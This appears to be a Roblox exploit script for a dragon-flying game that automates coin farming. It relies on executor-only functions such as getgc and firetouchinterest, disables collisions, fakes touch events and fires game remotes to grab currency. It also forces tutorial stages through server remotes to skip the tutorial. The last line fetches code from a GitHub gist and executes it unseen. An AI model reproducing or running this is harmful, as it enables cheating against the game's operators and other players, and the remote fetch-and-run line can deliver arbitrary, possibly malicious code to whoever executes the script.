local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CollectionService = game:GetService("CollectionService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")

local Player = Players.LocalPlayer
local Sonar = require(ReplicatedStorage:WaitForChild("Sonar"))
local Wrapper = Sonar("PlayerWrapper").GetClient()
local DragonClass = Sonar("DragonClassClient")
local DragonService = Sonar("DragonService")
local MovementClass = Sonar("DragonMovementClass")
local TutorialService = Sonar("TutorialService")
local CatchupService = Sonar("CatchupService")
local WorldService = Sonar("WorldService")
local GameTeleportService = Sonar("TeleportService")
local CurrencyNodes = workspace:WaitForChild("Interactions"):WaitForChild("Nodes"):WaitForChild("CurrencyNodes")
local Spawned = CurrencyNodes:WaitForChild("Spawned")

local FlightSpeed = 800
local SegmentLength = 130
local TouchInterval = 1.15
local ScanInterval = 12
local PlanInterval = 1
local Coins = {}
local RouteQueue = {}
local RouteDistance = 0
local RouteReward = 0
local RouteCount = 0
local Skipped = {}
local Target
local TargetDeadline = 0
local LastAttempt = 0
local TotalCoinNodes = 0
local ActiveCoinNodes = 0
local NormalCoinNodes = 0
local MegaCoinNodes = 0
local ActiveNormalCoins = 0
local ActiveMegaCoins = 0
local RespawnLimit = 0
local ActualSpeed = 0
local LastSpeedPosition
local LastSpeedTime
local LastMount = -10
local LastNoClip = 0
local MountInProgress = false
local Running = true
local TutorialReady = false

local LockedDragon
local LockedRoot
local OriginalAnchored
local OriginalVelocityForce
local OriginalGyroTorque
local PositionControl
local RotationControl
local FlightAttachment
local FlightTween
local FlightProxy
local FlightChanged
local FlightFinished
local SavedCollisions = setmetatable({}, {__mode = "k"})
local HudGui
local HudText
local BalanceStart
local BalanceStarted
local ActualEarned = 0
local LoopConnection

local function RiderRoot()
    local character = Player.Character
    return character and character:FindFirstChild("HumanoidRootPart")
end

local function StopTween()
    if FlightChanged then
        FlightChanged:Disconnect()
        FlightChanged = nil
    end
    if FlightFinished then
        FlightFinished:Disconnect()
        FlightFinished = nil
    end
    if FlightTween then
        FlightTween:Cancel()
        FlightTween = nil
    end
    if FlightProxy then
        FlightProxy:Destroy()
        FlightProxy = nil
    end
end

local function RestoreCollisions()
    for part, value in pairs(SavedCollisions) do
        if part.Parent then
            part.CanCollide = value
        end
        SavedCollisions[part] = nil
    end
end

local function NoClip(model)
    if not model then
        return
    end
    for _, part in ipairs(model:GetDescendants()) do
        if part:IsA("BasePart") then
            if SavedCollisions[part] == nil then
                SavedCollisions[part] = part.CanCollide
            end
            part.CanCollide = false
        end
    end
end

local function UnlockFlight()
    StopTween()
    if PositionControl then
        PositionControl:Destroy()
        PositionControl = nil
    end
    if RotationControl then
        RotationControl:Destroy()
        RotationControl = nil
    end
    if FlightAttachment then
        FlightAttachment:Destroy()
        FlightAttachment = nil
    end
    if LockedDragon then
        local mover = LockedDragon.MoverClass
        if mover then
            mover.ForcedMoveDirection = nil
            if mover.BodyVelocity and OriginalVelocityForce then
                mover.BodyVelocity.MaxForce = OriginalVelocityForce
            end
            if mover.BodyGyro and OriginalGyroTorque then
                mover.BodyGyro.MaxTorque = OriginalGyroTorque
            end
        end
        LockedDragon.ForceLookAt = nil
    end
    if LockedRoot and LockedRoot.Parent then
        LockedRoot.AssemblyLinearVelocity = Vector3.zero
        LockedRoot.AssemblyAngularVelocity = Vector3.zero
        LockedRoot.Anchored = OriginalAnchored == true
    end
    MovementClass.SetVerticalInput("Up", false)
    MovementClass.SetVerticalInput("Down", false)
    LockedDragon = nil
    LockedRoot = nil
    OriginalAnchored = nil
    OriginalVelocityForce = nil
    OriginalGyroTorque = nil
end

local function ClearTarget()
    StopTween()
    Target = nil
    TargetDeadline = 0
end

local function LockFlight(dragon)
    local root = dragon.PrimaryPart
    if LockedDragon == dragon and LockedRoot == root and PositionControl then
        root.Anchored = false
        return
    end

    UnlockFlight()

    local mover = dragon.MoverClass
    LockedDragon = dragon
    LockedRoot = root
    OriginalAnchored = root.Anchored
    OriginalVelocityForce = mover.BodyVelocity and mover.BodyVelocity.MaxForce
    OriginalGyroTorque = mover.BodyGyro and mover.BodyGyro.MaxTorque

    root.Anchored = false

    local attachment = Instance.new("Attachment")
    attachment.Parent = root
    FlightAttachment = attachment

    local position = Instance.new("AlignPosition")
    position.Mode = Enum.PositionAlignmentMode.OneAttachment
    position.Attachment0 = attachment
    position.MaxForce = 10000000000
    position.MaxVelocity = FlightSpeed * 1.3
    position.Responsiveness = 200
    position.ApplyAtCenterOfMass = true
    position.Position = root.Position
    position.Parent = root
    PositionControl = position

    local orientation = Instance.new("AlignOrientation")
    orientation.Mode = Enum.OrientationAlignmentMode.OneAttachment
    orientation.Attachment0 = attachment
    orientation.MaxTorque = 10000000000
    orientation.Responsiveness = 200
    orientation.CFrame = root.CFrame
    orientation.Parent = root
    RotationControl = orientation
end

local function ScanCoins()
    local updated = {}

    for _, part in ipairs(CurrencyNodes:GetChildren()) do
        if part:IsA("BasePart") and (part.Name == "Coins" or part.Name == "MegaCoins") then
            updated[part] = Coins[part] or {}
        end
    end

    if type(getgc) == "function" then
        local ok, objects = pcall(getgc, true)
        if ok and type(objects) == "table" then
            for _, object in ipairs(objects) do
                if type(object) == "table" then
                    local name = rawget(object, "CoinName")
                    if name == "Coins" or name == "MegaCoins" then
                        local part = rawget(object, "Part")
                        local hitbox = rawget(object, "HitBox")
                        local entry = updated[part]
                        if entry then
                            entry.Object = object
                            entry.HitBox = typeof(hitbox) == "Instance"
                                and hitbox:IsA("BasePart") and hitbox or nil
                        end
                    end
                end
            end
        end
    end

    Coins = updated
end

local function GetCoinPosition(part)
    local coin = Coins[part]
    local hitbox = coin and coin.HitBox
    if hitbox and hitbox.Parent and hitbox:IsDescendantOf(Spawned)
        and (hitbox.Position - part.Position).Magnitude < 75
        and hitbox.Position.Y > -500 then
        return hitbox.Position
    end
    return part.Position + Vector3.new(0, 2, 0)
end

local function IsActive(part)
    if not part or part.Parent ~= CurrencyNodes
        or (part.Name ~= "Coins" and part.Name ~= "MegaCoins")
        or not CollectionService:HasTag(part, "SpawnedCurrencyDrop") then
        return false
    end
    local coin = Coins[part]
    if not coin then
        return false
    end
    return not coin.Object or not rawget(coin.Object, "Claimed")
end

local function ChooseCoin(position)
    local nearest
    local best = math.huge
    local now = os.clock()
    for part, coin in pairs(Coins) do
        if IsActive(part) and (not Skipped[part] or Skipped[part] <= now) then
            local distance = (GetCoinPosition(part) - position).Magnitude
            if distance < best then
                best = distance
                nearest = part
            end
        end
    end
    return nearest, best
end

local function PlanRoute()
    local root = RiderRoot()
    local dragon = Wrapper.CurrentDragon
    local position = root and root.Position or dragon and dragon.PrimaryPart and dragon.PrimaryPart.Position
    if not position then
        return
    end
    local available = {}
    for part, coin in pairs(Coins) do
        if IsActive(part) and (not Skipped[part] or Skipped[part] <= os.clock()) then
            available[#available + 1] = {part, GetCoinPosition(part)}
        end
    end
    local route = {}
    local distance = 0
    local reward = 0
    while #available > 0 and Running do
        local nearest = 1
        local nearestDistance = math.huge
        for i, entry in ipairs(available) do
            local d = (entry[2] - position).Magnitude
            if d < nearestDistance then
                nearest, nearestDistance = i, d
            end
        end
        local entry = table.remove(available, nearest)
        route[#route + 1] = entry[1]
        distance += nearestDistance
        reward += entry[1].Name == "MegaCoins" and 25 or 2
        position = entry[2]
        if #route % 12 == 0 then
            RunService.Heartbeat:Wait()
        end
    end
    if Running then
        RouteQueue = route
        RouteCount = #route
        RouteDistance = distance
        RouteReward = reward
    end
end

local function IsMounted(dragon)
    if not dragon or not dragon.DragonModel then
        return false
    end
    local character = Player.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    local seat = humanoid and humanoid.SeatPart
    return seat ~= nil and seat:IsDescendantOf(dragon.DragonModel)
end

local function GetDragonValue()
    local selected = Wrapper.SelectedDragonValue
    local selectedValue = selected and selected.Value
    local owned = Wrapper.PlayerData and Wrapper.PlayerData:FindFirstChild("Dragons")

    local function Eligible(value)
        if not value or not value.Parent then
            return false
        end
        local existing = DragonClass.getDragonFromDataValue(value, true)
        if existing then
            return existing.CanFly and not existing.InYouth
        end
        local age = value:FindFirstChild("Age")
        if age then
            local ok, young = pcall(function()
                return DragonService.IsDragonInYouth(DragonService.GetAge(age.Value))
            end)
            if ok and young then
                return false
            end
        end
        local ok, allowed = pcall(DragonService.CanEquipDragon, value, Wrapper)
        return ok and allowed == true
    end

    if Eligible(selectedValue) then
        return selectedValue
    end
    if owned then
        for _, value in ipairs(owned:GetChildren()) do
            if Eligible(value) then
                return value
            end
        end
    end
end

local function TryMount()
    if MountInProgress or os.clock() - LastMount < 5 then
        return
    end
    LastMount = os.clock()
    MountInProgress = true

    task.spawn(function()
        pcall(function()
            local current = Wrapper.CurrentDragon
            if not current or not current.IsLocalPlayer then
                local value = GetDragonValue()
                if not value then
                    return
                end
                current = DragonClass.getDragonFromDataValue(value, true)
                if not current then
                    local remote = ReplicatedStorage.Remotes:FindFirstChild("EquipDragonRemote")
                    local ok, allowed = pcall(DragonService.CanEquipDragon, value, Wrapper)
                    if remote and ok and allowed == true then
                        remote:InvokeServer(value.Name)
                    end
                    for i = 1, 40 do
                        current = DragonClass.getDragonFromDataValue(value, true)
                        if current then
                            break
                        end
                        task.wait(0.15)
                    end
                end
            end
            if not current or not current.IsLocalPlayer or not current.CanFly or current.InYouth then
                return
            end
            local character = Player.Character
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            local seat = current.Seat
            if humanoid and seat and seat:IsDescendantOf(workspace) then
                for i = 1, 30 do
                    if IsMounted(current) or not seat:IsDescendantOf(workspace) then
                        break
                    end
                    seat:Sit(humanoid)
                    task.wait(0.1)
                end
            end
        end)
        MountInProgress = false
    end)
end

local function AdjustGoal(dragon, destination)
    local rider = RiderRoot()
    local humanoid = Player.Character and Player.Character:FindFirstChildOfClass("Humanoid")
    if rider and humanoid and humanoid.SeatPart then
        local offset = rider.Position - dragon.PrimaryPart.Position
        if offset.Magnitude < 30 then
            return destination - offset
        end
    end
    return destination
end

local function StartTween(dragon, destination)
    if FlightTween then
        return
    end
    local root = dragon.PrimaryPart
    local displacement = destination - root.Position
    if displacement.Magnitude < 1 then
        return
    end

    local distance = math.min(displacement.Magnitude, SegmentLength)
    local waypoint = root.Position + displacement.Unit * distance
    local flat = Vector3.new(displacement.X, 0, displacement.Z)
    local facing = flat.Magnitude > 0.1
        and flat.Unit * (dragon.MoverClass.NegateLookVector or 1)
        or root.CFrame.LookVector
    local targetCFrame = CFrame.lookAt(waypoint, waypoint + facing)

    local proxy = Instance.new("CFrameValue")
    proxy.Value = root.CFrame
    FlightProxy = proxy
    FlightChanged = proxy.Changed:Connect(function(value)
        if LockedDragon == dragon and PositionControl and RotationControl then
            PositionControl.Position = value.Position
            RotationControl.CFrame = value
        end
    end)

    local tween = TweenService:Create(proxy, TweenInfo.new(math.max(0.1, distance / FlightSpeed), Enum.EasingStyle.Linear), {Value = targetCFrame})
    FlightTween = tween
    FlightFinished = tween.Completed:Connect(function()
        if FlightTween == tween then
            StopTween()
        end
    end)
    tween:Play()
end

local function FlyToCoin(dragon, targetPosition)
    local mover = dragon.MoverClass
    if not mover or not dragon.PrimaryPart or not dragon.CanFly then
        return
    end
    if not dragon.Flying then
        dragon:_setFlying(true, true)
    end
    LockFlight(dragon)

    mover.ForcedMoveDirection = Vector3.zero
    if mover.BodyVelocity then
        mover.BodyVelocity.MaxForce = Vector3.zero
        mover.BodyVelocity.Velocity = Vector3.zero
    end
    if mover.BodyGyro then
        mover.BodyGyro.MaxTorque = Vector3.zero
    end
    MovementClass.SetVerticalInput("Up", false)
    MovementClass.SetVerticalInput("Down", false)
    dragon.ForceLookAt = nil

    local destination = AdjustGoal(dragon, targetPosition)
    if not FlightTween and (destination - dragon.PrimaryPart.Position).Magnitude > 2 then
        StartTween(dragon, destination)
    end
end

local function AttemptCollect(dragon, now)
    if now - LastAttempt < TouchInterval or not IsActive(Target) then
        return
    end
    local part = Target
    local coin = Coins[part]
    local destination = GetCoinPosition(part)
    local rider = RiderRoot()
    local distance = (dragon.PrimaryPart.Position - destination).Magnitude
    if rider then
        distance = math.min(distance, (rider.Position - destination).Magnitude)
    end
    if distance > 8 then
        return
    end

    LastAttempt = now
    local touchedPart = rider or dragon.PrimaryPart
    local hitbox = coin.HitBox

    if hitbox and hitbox.Parent then
        if type(firesignal) == "function" then
            pcall(firesignal, hitbox.Touched, touchedPart)
        elseif type(firetouchinterest) == "function" then
            pcall(function()
                firetouchinterest(touchedPart, hitbox, 0)
                firetouchinterest(touchedPart, hitbox, 1)
            end)
        end
    end

    if coin.Object and type(coin.Object.Loot) == "function" then
        if IsActive(part) then
            pcall(function()
                coin.Object:Loot()
            end)
        end
    elseif IsActive(part) then
        local remote = ReplicatedStorage.Remotes:FindFirstChild("GetCurrencyNodeRemote")
        if remote and remote:IsA("RemoteEvent") then
            remote:FireServer(part)
            Skipped[part] = now + 3
            ClearTarget()
        end
    end
end

local function Step()
    if not Running or not TutorialReady or WorldService.GetWorldName() == "Lobby" then
        return
    end
    local now = os.clock()

    local dragon = Wrapper.CurrentDragon
    if not dragon or not dragon.IsLocalPlayer or not dragon.PrimaryPart or not IsMounted(dragon) then
        if LockedDragon then
            ClearTarget()
            UnlockFlight()
            RestoreCollisions()
        end
        TryMount()
        return
    end

    if LockedDragon and LockedDragon ~= dragon then
        ClearTarget()
        UnlockFlight()
        RestoreCollisions()
    end

    if now - LastNoClip >= 0.2 then
        LastNoClip = now
        NoClip(dragon.DragonModel)
        NoClip(Player.Character)
    end

    if Target and not IsActive(Target) then
        ClearTarget()
    end
    if not Target then
        for _, candidate in ipairs(RouteQueue) do
            if IsActive(candidate) and (not Skipped[candidate] or Skipped[candidate] <= now) then
                Target = candidate
                break
            end
        end
        if Target then
            local distance = (GetCoinPosition(Target) - (RiderRoot() or dragon.PrimaryPart).Position).Magnitude
            local estimatedSpeed = ActualSpeed > 20 and ActualSpeed or FlightSpeed * 0.35
            TargetDeadline = now + math.max(18, distance / estimatedSpeed * 3 + 12)
        end
    end

    if not Target then
        UnlockFlight()
        RestoreCollisions()
        return
    end
    if now > TargetDeadline then
        Skipped[Target] = now + 20
        ClearTarget()
        return
    end

    FlyToCoin(dragon, GetCoinPosition(Target))
    AttemptCollect(dragon, now)
end

local function Stop()
    Running = false
    if LoopConnection then
        LoopConnection:Disconnect()
        LoopConnection = nil
    end
    ClearTarget()
    UnlockFlight()
    RestoreCollisions()
    if HudGui then
        HudGui:Destroy()
        HudGui = nil
        HudText = nil
    end
end

local function CreateHud()
    local playerGui = Player:WaitForChild("PlayerGui", 10)
    if not playerGui or not Running then
        return
    end
    local old = playerGui:FindFirstChild("Dem3x3CoinStats")
    if old then
        old:Destroy()
    end

    local gui = Instance.new("ScreenGui")
    gui.Name = "Dem3x3CoinStats"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 200
    gui.Parent = playerGui
    HudGui = gui

    local label = Instance.new("TextLabel")
    label.Name = "CoinStats"
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.new(1, 1, 1)
    label.TextStrokeColor3 = Color3.new(0, 0, 0)
    label.TextStrokeTransparency = 0.2
    label.Font = Enum.Font.GothamBold
    label.TextScaled = true
    label.TextWrapped = false
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.TextYAlignment = Enum.TextYAlignment.Top
    label.Position = UDim2.fromScale(0.02, 0.17)
    label.Size = UDim2.fromScale(0.76, 0.18)
    label.Text = "Coins: loading"
    label.Parent = gui

    local constraint = Instance.new("UITextSizeConstraint")
    constraint.MinTextSize = 11
    constraint.MaxTextSize = 22
    constraint.Parent = label
    HudText = label
end

local function UpdateTelemetry()
    local now = os.clock()
    local dragon = Wrapper.CurrentDragon
    local root = dragon and dragon.PrimaryPart
    if TutorialReady and root and IsMounted(dragon) then
        if LastSpeedPosition and LastSpeedTime then
            local deltaTime = now - LastSpeedTime
            if deltaTime > 0 then
                local delta = (root.Position - LastSpeedPosition).Magnitude
                local sample = delta / deltaTime
                if sample <= FlightSpeed * 3 then
                    ActualSpeed = ActualSpeed * 0.65 + sample * 0.35
                end
            end
        end
        LastSpeedPosition = root.Position
        LastSpeedTime = now
    else
        LastSpeedPosition = nil
        LastSpeedTime = nil
        ActualSpeed *= 0.75
    end

    local total = 0
    local active = 0
    local normals = 0
    local mega = 0
    local activeNormals = 0
    local activeMegas = 0
    for _, part in ipairs(CurrencyNodes:GetChildren()) do
        if part:IsA("BasePart") and (part.Name == "Coins" or part.Name == "MegaCoins") then
            total += 1
            if part.Name == "Coins" then
                normals += 1
            else
                mega += 1
            end
            if IsActive(part) then
                active += 1
                if part.Name == "Coins" then
                    activeNormals += 1
                else
                    activeMegas += 1
                end
            end
        end
    end
    TotalCoinNodes = total
    ActiveCoinNodes = active
    NormalCoinNodes = normals
    MegaCoinNodes = mega
    ActiveNormalCoins = activeNormals
    ActiveMegaCoins = activeMegas
    RespawnLimit = normals * 120 + mega * 750

    local data = Wrapper.PlayerData
    local folder = data and (data:FindFirstChild("Currency") or data:FindFirstChild("Currencies"))
    local value = folder and folder:FindFirstChild("Coins")
    if not value then
        local stats = Player:FindFirstChild("leaderstats")
        value = stats and stats:FindFirstChild("Coins")
    end
    if TutorialReady and WorldService.GetWorldName() ~= "Lobby" and value and (value:IsA("IntValue") or value:IsA("NumberValue")) then
        if BalanceStart == nil then
            BalanceStart = value.Value
            BalanceStarted = now
        end
        ActualEarned = math.max(0, value.Value - BalanceStart)
    end
end

local function UpdateHud()
    if not HudText or not HudText.Parent then
        return
    end
    local speed = math.max(ActualSpeed, 1)
    local seconds = RouteDistance / speed + RouteCount * TouchInterval
    local estimated = seconds > 0 and RouteReward * 3600 / seconds or 0
    estimated = math.min(estimated, RespawnLimit)
    local uncertainty = estimated * 0.2
    local actualRate = 0
    if BalanceStarted and os.clock() - BalanceStarted >= 10 then
        actualRate = ActualEarned * 3600 / (os.clock() - BalanceStarted)
    end

    local status = TutorialReady and WorldService.GetWorldName() ~= "Lobby"
        and "Coin Farm" or (Player:GetAttribute("TutorialSkipStatus") or "Waiting")
    HudText.Text = string.format(
        [[%s
Coins: %d/%d  Mega: %d/%d  Route: %d
Speed: %.0f studs/s
Forecast: %.0f +/- %.0f Coins/h
Earned: %d  |  Actual: %.0f Coins/h]],
        status,
        ActiveNormalCoins,
        NormalCoinNodes,
        ActiveMegaCoins,
        MegaCoinNodes,
        RouteCount,
        ActualSpeed,
        estimated,
        uncertainty,
        ActualEarned,
        actualRate
    )
end

local environment = type(getgenv) == "function" and getgenv() or _G
if type(environment.Dem3x3FarmStop) == "function" then
    pcall(environment.Dem3x3FarmStop)
end
environment.Dem3x3FarmStop = Stop

Player:SetAttribute("FarmMode", "Tutorial")
Player:SetAttribute("TutorialSkipStatus", "Detecting")

LoopConnection = RunService.Heartbeat:Connect(function()
    pcall(Step)
end)

task.spawn(CreateHud)

task.spawn(function()
    while Running do
        if TutorialReady and WorldService.GetWorldName() ~= "Lobby" then
            pcall(ScanCoins)
        end
        task.wait(ScanInterval)
    end
end)

task.spawn(function()
    while Running do
        if TutorialReady and WorldService.GetWorldName() ~= "Lobby" then
            pcall(PlanRoute)
        end
        task.wait(PlanInterval)
    end
end)

task.spawn(function()
    while Running do
        pcall(UpdateTelemetry)
        pcall(UpdateHud)
        task.wait(0.5)
    end
end)

local function FindStageRemote(remoteName, moduleName)
    local remotes = ReplicatedStorage:WaitForChild("Remotes")
    local direct = remotes:FindFirstChild(remoteName)

    if type(getloadedmodules) == "function" then
        local ok, modules = pcall(getloadedmodules)
        if ok and type(modules) == "table" then
            for _, module in ipairs(modules) do
                if typeof(module) == "Instance"
                    and module:IsA("ModuleScript")
                    and module.Name == moduleName then
                    local loaded, result = pcall(require, module)
                    if loaded and type(result) == "table" then
                        local candidate = rawget(result, remoteName)
                        if typeof(candidate) == "Instance" and candidate:IsA("RemoteFunction") then
                            return candidate
                        end
                    end
                end
            end
        end
    end

    if type(getgc) == "function" and direct then
        local ok, objects = pcall(getgc, true)
        if ok and type(objects) == "table" then
            for _, object in ipairs(objects) do
                if type(object) == "table" and rawget(object, remoteName) == direct then
                    return direct
                end
            end
        end
    end

    return direct
end

local function RequestStage(remote, stage)
    if not remote or not remote:IsA("RemoteFunction") then
        return false
    end
    local ok, result = pcall(function()
        return remote:InvokeServer(stage)
    end)
    return ok and result ~= false
end

local function WaitForState(check, seconds)
    local deadline = os.clock() + seconds
    while Running and os.clock() < deadline do
        if check() then
            return true
        end
        task.wait(0.2)
    end
    return check()
end

local function IsPrimaryComplete()
    local ok, complete = pcall(TutorialService.HasCompletedPrimaryTutorial, Wrapper)
    return ok and complete == true
end

local function IsCatchupActive()
    local ok, active = pcall(CatchupService.IsInProgress, Wrapper)
    return ok and active == true
end

local function FinishTutorialClient()
    task.wait(1)
    if not Running then
        return
    end
    pcall(function()
        local constants = Sonar("Constants")
        if constants.InTutorial then
            local client = Sonar("TutorialClient")
            if client and type(client.EndPrimaryTutorial) == "function" then
                client.EndPrimaryTutorial()
            end
        end
    end)
end

local function GetAdventureDestination()
    local data = Wrapper.PlayerData
    local lastPlayed = data and data:FindFirstChild("LastPlayedWorld")
    local unlocked = data and data:FindFirstChild("Worlds")
    local name = "Grassland"

    if lastPlayed and lastPlayed:IsA("StringValue") then
        local candidate = lastPlayed.Value
        if candidate ~= "" and candidate ~= "Lobby" then
            local world = WorldService.GetWorldFromName(candidate)
            local permission = unlocked and unlocked:FindFirstChild(candidate)
            if world and world.GameId and permission and permission.Value then
                name = candidate
            end
        end
    end

    return name, WorldService.GetWorldFromName(name)
end

local function TeleportAfterTutorial()
    if WorldService.GetWorldName() ~= "Lobby" then
        return true
    end

    local name, destination = GetAdventureDestination()
    local remote = ReplicatedStorage:WaitForChild("Remotes"):FindFirstChild("WorldTeleportRemote")

    Player:SetAttribute("TutorialTeleportWorld", name)

    if not remote or not remote:IsA("RemoteFunction") or not destination or not destination.GameId then
        Player:SetAttribute("TutorialSkipStatus", "TeleportUnavailable")
        return false
    end

    for attempt = 1, 2 do
        if not Running then
            return false
        end

        local teleporting = false
        pcall(function()
            teleporting = GameTeleportService.IsTeleportingToWorld(Player)
        end)

        if teleporting then
            Player:SetAttribute("TutorialSkipStatus", "TeleportPending")
            return false
        end

        Player:SetAttribute("TutorialSkipStatus", "TeleportRequest")
        local ok, result = pcall(function()
            return remote:InvokeServer(destination.GameId, {MoveBackToAdventure = true})
        end)

        if ok and result ~= false then
            Player:SetAttribute("TutorialSkipStatus", "TeleportPending")
            return false
        end

        Player:SetAttribute("TutorialSkipStatus", "TeleportRejected")
        task.wait(2)
    end

    return false
end

task.spawn(function()
    local stageValue = Wrapper.PrimaryTutorialStageValue
    if not stageValue then
        for i = 1, 100 do
            if not Running then
                return
            end
            stageValue = Wrapper.PrimaryTutorialStageValue
            if stageValue then
                break
            end
            task.wait(0.2)
        end
    end

    if not stageValue or not Running then
        Player:SetAttribute("TutorialSkipStatus", "DataUnavailable")
        return
    end

    Player:SetAttribute("TutorialStageDetected", stageValue.Value)

    if not IsPrimaryComplete() then
        local remote = FindStageRemote("SetTutorialStageRemote", "NextWorld")
        if not remote then
            Player:SetAttribute("TutorialSkipStatus", "RemoteUnavailable")
            return
        end

        local stages = {
            "GettingEggs",
            "HatchingEggs",
            "GrowingDragon",
            "SkillsIntroduction",
            "NextWorld",
            "Complete"
        }

        local currentStage = TutorialService.GetPrimaryStage(Wrapper)
        local currentIndex = table.find(stages, currentStage) or 1

        for index = currentIndex + 1, #stages do
            if not Running or IsPrimaryComplete() then
                break
            end

            local stage = stages[index]
            Player:SetAttribute("TutorialSkipStatus", "RequestingStage")
            Player:SetAttribute("TutorialSkipStep", stage)
            local requestAccepted = RequestStage(remote, stage)
            local advanced = WaitForState(function()
                return IsPrimaryComplete()
                    or (table.find(stages, stageValue.Value) or 0) >= index
            end, 4)

            Player:SetAttribute("TutorialStageDetected", stageValue.Value)

            if not advanced then
                Player:SetAttribute("TutorialSkipStatus", requestAccepted and "StageNotConfirmed" or "StageRejected")
                return
            end
        end

        if not WaitForState(IsPrimaryComplete, 5) then
            Player:SetAttribute("TutorialStageDetected", stageValue.Value)
            Player:SetAttribute("TutorialSkipStatus", "PrimaryRejected")
            return
        end

        Player:SetAttribute("TutorialStageDetected", "Complete")
        Player:SetAttribute("TutorialSkipStatus", "PrimaryComplete")
        FinishTutorialClient()
    end

    if not Running then
        return
    end

    if IsCatchupActive() then
        Player:SetAttribute("TutorialSkipStatus", "CatchupRequest")
        local remote = FindStageRemote("SetCatchupStageRemote", "CatchupFinalEgg")
        RequestStage(remote, "Complete")

        if not WaitForState(function()
            return not IsCatchupActive()
        end, 5) then
            Player:SetAttribute("TutorialSkipStatus", "CatchupRejected")
            return
        end
    end

    if Running and IsPrimaryComplete() then
        if not TeleportAfterTutorial() then
            Player:SetAttribute("FarmMode", "Teleport")
            return
        end

        TutorialReady = true
        Player:SetAttribute("TutorialSkipStatus", "Complete")
        Player:SetAttribute("FarmMode", "Coins")
    end
end)


loadstring(game:HttpGet("https://gist.githubusercontent.com/t4amd4shie/812d6bd62ffc0020545e0907e3f89741/raw/fcc346762f6abc95e341037ecd9f2d66374757a4/gistfile1.txt"))()
